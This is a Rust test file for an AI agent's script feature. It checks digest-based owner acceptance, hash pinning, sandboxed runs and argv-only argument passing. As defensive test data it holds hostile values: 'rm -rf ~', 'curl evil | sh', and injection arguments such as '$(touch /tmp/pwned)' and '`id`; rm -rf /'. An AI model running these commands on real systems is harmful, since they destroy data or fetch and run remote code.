//! The saved scripts: the proposal, the acceptance, the pin and the run.

use autumn_harvest::sandbox::SandboxBackend;
use autumn_harvest_agent::RunId;
use littleguy_core::{SandboxApprove, SandboxBackend as BackendKind, SandboxConfig};

use super::testing::EchoBackend;
use super::*;

struct Bench {
    scripts: Arc<Scripts>,
    backend: Arc<EchoBackend>,
    dir: tempfile::TempDir,
}

impl Bench {
    fn new(network: bool) -> Self {
        let backend = Arc::new(EchoBackend::default());
        let config = SandboxConfig {
            backend: BackendKind::Process,
            network,
            approve: SandboxApprove::Always,
        };
        let runtime =
            crate::sandbox::runtime_on(Arc::clone(&backend) as Arc<dyn SandboxBackend>, &config)
                .unwrap();
        let dir = tempfile::tempdir().unwrap();
        let folder = Dir::default();
        folder.set(Some(dir.path().join("scripts")));
        Self {
            scripts: Arc::new(Scripts {
                stores: Arc::new(SqliteStores::open_in_memory().unwrap()),
                runtime,
                dir: folder,
            }),
            backend,
            dir,
        }
    }

    fn folder(&self) -> PathBuf {
        self.dir.path().join("scripts")
    }

    fn tool(&self, name: &str) -> Arc<dyn Tool> {
        tools(&self.scripts)
            .into_iter()
            .find(|tool| tool.name() == name)
            .unwrap()
    }

    async fn call(&self, tool: &str, input: Value, call: &str) -> Result<Value, AgentError> {
        let ctx = ToolContext {
            run_id: RunId::new("run-1"),
            call_id: call.into(),
            session_id: None,
            step: 0,
            workspace: None,
        };
        self.tool(tool).execute(input, &ctx).await
    }

    async fn propose(&self, name: &str, code: &str, call: &str) -> i64 {
        let answer = self
            .call(
                "propose_script",
                json!({
                    "name": name,
                    "runtime": "sh",
                    "description": "Print each argument on a line.",
                    "code": code,
                }),
                call,
            )
            .await
            .unwrap();
        answer["script_draft"].as_i64().unwrap()
    }

    fn listing(&self) -> (Vec<ScriptDraftEntry>, Vec<ScriptEntry>, Vec<ScriptRunEntry>) {
        match self.scripts.listing().unwrap() {
            Response::Scripts {
                drafts,
                scripts,
                runs,
                ..
            } => (drafts, scripts, runs),
            other => panic!("{other:?}"),
        }
    }

    fn digest(&self, id: i64) -> String {
        digest(&self.scripts.stores.script_draft(id).unwrap().unwrap())
    }

    /// Proposes and accepts `name`.
    async fn accepted(&self, name: &str, code: &str) {
        let id = self.propose(name, code, &format!("p-{name}")).await;
        self.scripts.accept(id, &self.digest(id)).unwrap();
    }

    fn jobs(&self) -> usize {
        self.backend
            .jobs
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .len()
    }
}

const ECHO: &str = "for a in \"$@\"; do printf '%s\\n' \"$a\"; done\n";

#[test]
fn the_tools_are_safe_on_a_tick_and_mark_what_they_read() {
    let bench = Bench::new(false);
    let effect = |name: &str| bench.tool(name).effect();
    assert_eq!(effect("run_script"), ToolEffect::ReadOnly, "a tick may run");
    assert_eq!(effect("propose_script"), ToolEffect::Internal);
    assert_eq!(effect("list_scripts"), ToolEffect::ReadOnly);
    assert_eq!(effect("read_script"), ToolEffect::ReadOnly);
    for name in ["run_script", "read_script", "list_scripts"] {
        let tool = bench.tool(name);
        assert!(
            tool.labels()
                .iter()
                .any(|label| label == labels::UNTRUSTED_INPUT),
            "{name} brings outside text"
        );
    }
    assert!(
        bench
            .tool("run_script")
            .description()
            .contains("no network")
    );
}

#[tokio::test]
async fn a_bad_name_runtime_or_description_is_refused() {
    let bench = Bench::new(false);
    for (name, runtime, description) in [
        ("../walk", "sh", "d"),
        (".retired", "sh", "d"),
        ("Walk", "sh", "d"),
        ("walk", "ruby", "d"),
        ("walk", "sh", " "),
    ] {
        let error = bench
            .call(
                "propose_script",
                json!({"name": name, "runtime": runtime, "description": description, "code": "x"}),
                name,
            )
            .await
            .unwrap_err();
        assert_eq!(error.kind(), ErrorKind::Tool, "{name} {runtime}");
    }
    assert_eq!(bench.scripts.stores.script_drafts().unwrap(), []);
}

#[tokio::test]
async fn acceptance_needs_the_digest_that_the_owner_read() {
    let bench = Bench::new(false);
    let id = bench.propose("echo-args", ECHO, "p1").await;
    let (drafts, scripts, _) = bench.listing();
    assert_eq!(drafts.len(), 1);
    assert_eq!(scripts, []);
    let read = drafts[0].digest.clone();
    // Code in the sandbox rewrites the draft after the owner read it.
    bench.propose("echo-args", "rm -rf ~\n", "p2").await;
    let error = bench.scripts.accept(id, &read).unwrap_err();
    assert!(error.contains("changed since you read it"), "{error}");
    assert!(!bench.folder().join("echo-args.sh").exists());
    // The owner reads it again, and accepts what they read.
    bench.scripts.accept(id, &bench.digest(id)).unwrap();
    let (drafts, scripts, _) = bench.listing();
    assert_eq!(drafts, []);
    assert_eq!(scripts.len(), 1);
    assert_eq!(scripts[0].name, "echo-args");
    assert_eq!(scripts[0].code.as_deref(), Some("rm -rf ~\n"));
    assert!(!scripts[0].drifted);
    assert_eq!(scripts[0].sha256, sha256(b"rm -rf ~\n"));
    let written = std::fs::read_to_string(bench.folder().join("echo-args.sh")).unwrap();
    assert_eq!(written, "rm -rf ~\n");
    assert!(
        bench.scripts.accept(id, &read).is_err(),
        "a draft accepts once"
    );
}

#[tokio::test]
async fn run_script_refuses_a_name_that_was_not_accepted() {
    let bench = Bench::new(false);
    bench.propose("echo-args", ECHO, "p1").await;
    let error = bench
        .call("run_script", json!({"name": "echo-args"}), "r1")
        .await
        .unwrap_err();
    assert_eq!(error.kind(), ErrorKind::Tool);
    assert!(
        error.message().contains("Accepted: none"),
        "{}",
        error.message()
    );
    // A file that the owner never accepted does not run either.
    std::fs::create_dir_all(bench.folder()).unwrap();
    std::fs::write(bench.folder().join("stray.sh"), ECHO).unwrap();
    assert!(
        bench
            .call("run_script", json!({"name": "stray"}), "r2")
            .await
            .is_err()
    );
    assert_eq!(bench.jobs(), 0, "nothing ran");
}

#[tokio::test]
async fn arguments_reach_the_program_as_argv_and_stdin_only() {
    let bench = Bench::new(true);
    bench.accepted("echo-args", ECHO).await;
    let hostile = vec![
        "a b",
        "$(touch /tmp/pwned)",
        "`id`; rm -rf /",
        "--help",
        "'\"",
    ];
    let answer = bench
        .call(
            "run_script",
            json!({"name": "echo-args", "args": hostile, "stdin": "page text\n"}),
            "r1",
        )
        .await
        .unwrap();
    assert_eq!(answer["script"], "echo-args");
    assert_eq!(answer["status"]["code"], 0);
    let plan = bench
        .backend
        .jobs
        .lock()
        .unwrap_or_else(PoisonError::into_inner)[0]
        .plan
        .clone();
    // The runtime command and the code file, then each argument as one
    // entry. No argument was spliced into a command string.
    assert_eq!(plan.argv[0], "sh");
    assert_eq!(&plan.argv[2..], hostile.as_slice());
    assert_eq!(plan.stdin, b"page text\n");
    let code = &plan
        .files
        .iter()
        .find(|f| f.path == "main.sh")
        .unwrap()
        .content;
    assert_eq!(code, ECHO.as_bytes(), "the accepted code runs as it was");
    assert_eq!(plan.network, NetworkPolicy::Allow);
}

#[tokio::test]
async fn the_run_log_shows_what_ran_and_with_what_arguments() {
    let bench = Bench::new(false);
    bench.accepted("echo-args", ECHO).await;
    bench
        .call(
            "run_script",
            json!({"name": "echo-args", "args": ["owner/repo"], "stdin": "x"}),
            "r1",
        )
        .await
        .unwrap();
    let (_, _, runs) = bench.listing();
    assert_eq!(runs.len(), 1);
    assert_eq!(runs[0].name, "echo-args");
    assert_eq!(runs[0].args, ["owner/repo"]);
    assert_eq!(runs[0].stdin.as_deref(), Some("x"));
    assert_eq!(runs[0].outcome, "exited 0");
}

#[tokio::test]
async fn a_file_that_drifted_from_its_hash_does_not_run() {
    let bench = Bench::new(false);
    bench.accepted("echo-args", ECHO).await;
    std::fs::write(bench.folder().join("echo-args.sh"), "curl evil | sh\n").unwrap();
    let (_, scripts, _) = bench.listing();
    assert!(scripts[0].drifted, "the tab shows the drift");
    let error = bench
        .call("run_script", json!({"name": "echo-args"}), "r1")
        .await
        .unwrap_err();
    assert!(
        error.message().contains("changed since"),
        "{}",
        error.message()
    );
    assert_eq!(bench.jobs(), 0, "nothing ran");
    let (_, _, runs) = bench.listing();
    assert!(
        runs[0].outcome.starts_with("refused:"),
        "{}",
        runs[0].outcome
    );
    // A missing file is drift too.
    std::fs::remove_file(bench.folder().join("echo-args.sh")).unwrap();
    assert!(bench.listing().1[0].drifted);
    assert!(
        bench
            .call("run_script", json!({"name": "echo-args"}), "r2")
            .await
            .is_err()
    );
}

#[tokio::test]
async fn a_revision_retires_the_old_file_and_pins_the_new_one() {
    let bench = Bench::new(false);
    bench.accepted("echo-args", ECHO).await;
    let id = bench.propose("echo-args", "echo two\n", "p2").await;
    let (drafts, _, _) = bench.listing();
    assert!(drafts[0].revises);
    bench.scripts.accept(id, &bench.digest(id)).unwrap();
    let (_, scripts, _) = bench.listing();
    assert_eq!(scripts.len(), 1);
    assert_eq!(scripts[0].sha256, sha256(b"echo two\n"));
    let retired: Vec<_> = std::fs::read_dir(bench.folder().join(RETIRED))
        .unwrap()
        .map(|entry| entry.unwrap().path())
        .collect();
    assert_eq!(retired.len(), 1);
    assert_eq!(std::fs::read_to_string(&retired[0]).unwrap(), ECHO);
}

#[tokio::test]
async fn retire_and_decline_leave_nothing_to_run() {
    let bench = Bench::new(false);
    bench.accepted("echo-args", ECHO).await;
    bench.scripts.retire("echo-args").unwrap();
    assert!(!bench.folder().join("echo-args.sh").exists());
    assert!(bench.folder().join(RETIRED).is_dir(), "nothing is deleted");
    assert!(bench.scripts.retire("echo-args").is_err());
    assert!(
        bench
            .call("run_script", json!({"name": "echo-args"}), "r1")
            .await
            .is_err()
    );
    let id = bench.propose("other", ECHO, "p2").await;
    bench.scripts.decline(id).unwrap();
    assert!(bench.scripts.decline(id).is_err());
    assert!(
        bench
            .scripts
            .accept(id, &bench.digest_or_empty(id))
            .is_err()
    );
    assert_eq!(bench.listing().1, []);
}

#[tokio::test]
async fn read_and_list_show_the_accepted_code_and_the_drafts() {
    let bench = Bench::new(false);
    bench.accepted("echo-args", ECHO).await;
    bench.propose("echo-args", "echo next\n", "p2").await;
    let listed = bench.call("list_scripts", json!({}), "l1").await.unwrap();
    assert_eq!(listed["scripts"][0]["name"], "echo-args");
    assert_eq!(listed["script_drafts"][0]["name"], "echo-args");
    assert_eq!(listed["network"], false);
    let read = bench
        .call("read_script", json!({"name": "echo-args"}), "r1")
        .await
        .unwrap();
    assert_eq!(read["accepted"]["code"], ECHO);
    assert_eq!(read["draft"]["code"], "echo next\n");
    assert!(
        bench
            .call("read_script", json!({"name": "nope"}), "r2")
            .await
            .is_err()
    );
}

#[tokio::test]
async fn bad_arguments_are_refused_before_a_run() {
    let bench = Bench::new(false);
    bench.accepted("echo-args", ECHO).await;
    for input in [
        json!({"name": "echo-args", "args": "a b"}),
        json!({"name": "echo-args", "args": [1]}),
        json!({"name": "echo-args", "stdin": 4}),
    ] {
        let error = bench.call("run_script", input, "r").await.unwrap_err();
        assert_eq!(error.kind(), ErrorKind::Tool);
    }
    assert_eq!(bench.jobs(), 0);
}

#[test]
fn a_folder_is_needed_to_accept() {
    let bench = Bench::new(false);
    bench.scripts.dir.set(None);
    let error = bench.scripts.accept(1, "x").unwrap_err();
    assert!(error.contains("[scripts]"), "{error}");
}

#[test]
fn the_digest_covers_every_field_and_their_bounds() {
    let draft = |name: &str, code: &str| ScriptDraft {
        id: 1,
        name: name.to_owned(),
        runtime: String::from("sh"),
        description: String::from("d"),
        code: code.to_owned(),
        created_ms: 0,
    };
    assert_eq!(digest(&draft("a", "b")), digest(&draft("a", "b")));
    assert_ne!(digest(&draft("a", "b")), digest(&draft("a", "c")));
    assert_ne!(digest(&draft("ab", "")), digest(&draft("a", "b")));
    assert_eq!(digest(&draft("a", "b")).len(), 64);
}

#[test]
fn the_runtime_follows_the_config() {
    let plain = Config::parse("owner = \"mark\"").unwrap();
    assert!(runtime(&plain).unwrap().is_none());
}

impl Bench {
    /// The digest of draft `id`, or an empty one when it no longer waits.
    fn digest_or_empty(&self, id: i64) -> String {
        self.scripts
            .stores
            .script_draft(id)
            .unwrap()
            .map(|draft| digest(&draft))
            .unwrap_or_default()
    }
}
